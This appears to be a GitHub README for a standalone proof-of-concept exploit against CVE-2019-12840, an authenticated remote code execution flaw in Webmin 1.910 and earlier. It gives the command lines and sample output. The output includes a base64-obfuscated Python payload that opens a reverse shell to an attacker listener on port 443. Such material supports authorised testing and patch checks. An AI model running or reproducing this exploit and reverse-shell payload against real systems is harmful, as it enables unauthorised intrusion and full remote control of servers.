# webmin_cve-2019-12840_poc
A standalone POC for CVE-2019-12840.
Below will send back a reverse shell on port 443

~~~
$ python3 CVE-2019-12840.py  -u https://192.168.122.10 -U matt -P Secret123 -lhost 192.168.122.1 -lport 443

  _______      ________    ___   ___  __  ___        __ ___   ___  _  _    ___  
 / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ |__ \ / _ \| || |  / _ \ 
| |     \ \  / /| |__ ______ ) | | | || | (_) |______| |  ) | (_) | || |_| | | |
| |      \ \/ / |  __|______/ /| | | || |\__, |______| | / / > _ <|__   _| | | |
| |____   \  /  | |____    / /_| |_| || |  / /       | |/ /_| (_) |  | | | |_| |
 \_____|   \/   |______|  |____|\___/ |_| /_/        |_|____|\___/   |_|  \___/ 
                                                                              
                           by KrE80r 

             Webmin <= 1.910 RCE (Authorization Required)

usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -c "id"
usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -lhost <LOCAL_IP> -lport 443


[*] logging in ...

[+] got sid cd97c25b388e8ecd36f15571b223a8bf

[*] sending command python -c "import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTIyLjEiLDQ0MykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk='))"
~~~
